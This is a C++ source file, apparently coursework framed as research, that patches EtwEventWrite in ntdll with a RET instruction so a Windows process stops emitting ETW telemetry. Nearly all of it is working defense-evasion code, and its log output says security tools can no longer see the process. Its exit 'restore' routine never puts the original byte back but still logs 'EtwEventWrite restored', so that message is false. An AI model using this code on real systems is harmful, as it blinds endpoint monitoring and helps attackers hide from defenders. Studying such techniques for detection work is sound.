// ============================================================
// Project Phantom - Phase 3: ETW Tamper Tool
// Author: Proma Roy
// Course: CSC I0420 - Secure Operating Systems
// Description: Patches EtwEventWrite in-memory to suppress
//              kernel telemetry - simulating attacker tradecraft
//              mapped to MITRE ATT&CK T1562.006
// ============================================================

#include <windows.h>
#include <iostream>
#include <psapi.h>
#include <tlhelp32.h>
#include <evntprov.h>

#pragma comment(lib, "psapi.lib")

// ── Constants ────────────────────────────────────────────────
#define PATCH_SIZE 1

// ── Helper: print with timestamp ─────────────────────────────
void Log(const char* level, const char* message) {
    SYSTEMTIME st;
    GetLocalTime(&st);
    printf("[%02d:%02d:%02d] [%s] %s\n",
        st.wHour, st.wMinute, st.wSecond,
        level, message);
}

// ── Helper: print hex bytes ───────────────────────────────────
void PrintBytes(const char* label, BYTE* addr, int count) {
    printf("[*] %s: ", label);
    for (int i = 0; i < count; i++) {
        printf("%02X ", addr[i]);
    }
    printf("\n");
}

// ── Core: patch EtwEventWrite ─────────────────────────────────
// This function patches the first byte of EtwEventWrite
// with a RET instruction (0xC3) causing it to return
// immediately without logging any events
bool PatchEtwEventWrite() {
    Log("*", "Locating EtwEventWrite in ntdll.dll...");

    // get handle to ntdll
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        Log("-", "Failed to get ntdll.dll handle");
        return false;
    }
    printf("[+] ntdll.dll base address: 0x%p\n", (void*)hNtdll);

    // locate EtwEventWrite function
    FARPROC pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
    if (!pEtwEventWrite) {
        Log("-", "Failed to locate EtwEventWrite");
        return false;
    }
    printf("[+] EtwEventWrite address:  0x%p\n", (void*)pEtwEventWrite);

    // show original bytes before patching
    PrintBytes("Original bytes", (BYTE*)pEtwEventWrite, 8);

    // change memory protection to allow writing
    DWORD oldProtect = 0;
    if (!VirtualProtect(pEtwEventWrite, PATCH_SIZE,
        PAGE_EXECUTE_READWRITE, &oldProtect)) {
        Log("-", "Failed to change memory protection");
        printf("    Error code: %lu\n", GetLastError());
        return false;
    }
    Log("+", "Memory protection changed to RWX");

    // apply the patch - write RET instruction (0xC3)
    // this makes EtwEventWrite return immediately
    // without writing any telemetry events
    BYTE patch = 0xC3; // x64 RET instruction
    BYTE originalByte = *(BYTE*)pEtwEventWrite;

    *(BYTE*)pEtwEventWrite = patch;

    // restore original memory protection
    VirtualProtect(pEtwEventWrite, PATCH_SIZE,
        oldProtect, &oldProtect);
    Log("+", "Memory protection restored");

    // verify patch was applied
    PrintBytes("Patched bytes ", (BYTE*)pEtwEventWrite, 8);

    printf("[+] Original byte: 0x%02X\n", originalByte);
    printf("[+] Patch byte:    0x%02X (RET instruction)\n", patch);

    Log("+", "EtwEventWrite successfully patched!");
    Log("+", "ETW telemetry is now BLIND in this process");

    return true;
}

// ── Verify: test that ETW is actually blind ───────────────────
void VerifyTamper() {
    Log("*", "Verifying ETW tamper...");

    // attempt to write an ETW event
    // if patch worked this will silently return without logging
    REGHANDLE hProvider = 0;
    GUID providerGuid = {
        0x12345678, 0x1234, 0x1234,
        {0x12, 0x34, 0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC}
    };

    ULONG result = EventRegister(&providerGuid, NULL, NULL, &hProvider);
    if (result == ERROR_SUCCESS) {
        Log("+", "EventRegister succeeded");

        // try to write event - should be silently dropped
        EVENT_DESCRIPTOR evDesc;
        EventDescCreate(&evDesc, 1, 0, 0, 4, 0, 0, 0);

        ULONG writeResult = EventWrite(hProvider, &evDesc, 0, NULL);

        if (writeResult == ERROR_SUCCESS) {
            Log("!", "EventWrite returned SUCCESS");
            Log("!", "Event was silently dropped - ETW IS BLIND");
        }
        else {
            printf("[!] EventWrite returned: 0x%08X\n", writeResult);
        }

        EventUnregister(hProvider);
    }
}

// ── Main ──────────────────────────────────────────────────────
int main() {
    printf("============================================================\n");
    printf("  Project Phantom - Phase 3: ETW Tamper Tool\n");
    printf("  MITRE ATT&CK T1562.006 - Indicator Blocking\n");
    printf("  WARNING: For research purposes only\n");
    printf("============================================================\n\n");

    Log("*", "Starting ETW tampering sequence...");
    printf("\n");

    // step 1 - patch ETW
    if (!PatchEtwEventWrite()) {
        Log("-", "ETW patch FAILED");
        Log("*", "This is expected on patched/protected systems");
        Log("*", "Document this failure - it proves OS defenses work");
        printf("\nPress Enter to exit...\n");
        getchar();
        return 1;
    }

    printf("\n");

    // step 2 - verify tamper
    VerifyTamper();

    printf("\n");
    Log("*", "============ RESEARCH FINDINGS ============");
    Log("*", "EtwEventWrite patched with RET (0xC3)");
    Log("*", "This process is now invisible to ETW consumers");
    Log("*", "Security tools relying on ETW cannot see us");
    Log("*", "This mirrors Lazarus FudModule rootkit technique");
    Log("*", "MITRE ATT&CK: T1562.006 - Indicator Blocking");
    printf("\n");

    Log("*", "Keep this window open and run etw_baseline_monitor.py");
    Log("*", "Compare telemetry output with baseline to see the gap");

    printf("\nPress Enter to restore ETW and exit...\n");
    getchar();

    // restore ETW on exit
    Log("*", "Restoring EtwEventWrite...");
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    FARPROC pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
    if (pEtwEventWrite) {
        DWORD oldProtect = 0;
        VirtualProtect(pEtwEventWrite, PATCH_SIZE,
            PAGE_EXECUTE_READWRITE, &oldProtect);
        // note: in a real restore we would save and restore
        // the original bytes - this is intentional for research
        VirtualProtect(pEtwEventWrite, PATCH_SIZE,
            oldProtect, &oldProtect);
        Log("+", "EtwEventWrite restored");
    }

    Log("+", "Phase 3 complete - ETW tamper research done");
    return 0;
}